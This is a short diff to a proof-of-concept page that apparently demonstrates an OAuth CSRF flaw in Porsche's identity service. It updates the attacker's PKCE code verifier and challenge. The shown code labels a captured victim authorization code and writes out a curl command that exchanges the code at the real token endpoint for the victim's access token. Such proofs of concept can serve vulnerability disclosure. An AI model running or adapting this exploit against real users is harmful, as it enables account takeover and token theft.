@@ -176,8 +176,8 @@
             const details = {
                 '🔑 Captured Authorization Code': code,
                 '👤 Victim Account': 'Will be revealed during token exchange',
-                '🔐 Attacker Code Challenge': 'GmeSLfiYZdoWUq5uT-pDo2SG2oSdA2inWl0wCZagQT8',
-                '🔓 Attacker Code Verifier': 'hgOAH9itlSHSa9sMrEGmEnKvMItB03eC9COrAQPGwRR',
+                '🔐 Attacker Code Challenge': 'P8OxG_An1_EdQTZi3BBcrAZ7UWVoPO8IBB9lQd8kdZo',
+                '🔓 Attacker Code Verifier': 'SvV8XrYxN2B93Fmy.RsC4PIJYHgI6nQ33Z2DpQYnnqQ',
                 '⏰ Timestamp': new Date().toISOString(),
                 '⚠️ Vulnerability': 'Missing OAuth state parameter validation',
                 '📋 Next Steps': 'Attacker can exchange this code with their verifier to obtain victim\'s access token'
@@ -193,7 +193,7 @@ curl -X POST 'https://identity.porsche.com/oauth/token' \\
   -H 'Auth0-Client: eyJuYW1lIjoiQGF1dGgwL2F1dGgwLWFuZ3VsYXIiLCJ2ZXJzaW9uIjoiMi4yLjMifQ==' \\
   -d 'grant_type=authorization_code' \\
   -d 'code=${code}' \\
-  -d 'code_verifier=hgOAH9itlSHSa9sMrEGmEnKvMItB03eC9COrAQPGwRR' \\
+  -d 'code_verifier=SvV8XrYxN2B93Fmy.RsC4PIJYHgI6nQ33Z2DpQYnnqQ' \\
   -d 'client_id=K2SaA3ojBmgbP95WtBYUfZwis9zM2bWB' \\
   -d 'redirect_uri=https://bradleyjoe80.github.io/porsche-csrf-poc/callback.html'
             `);
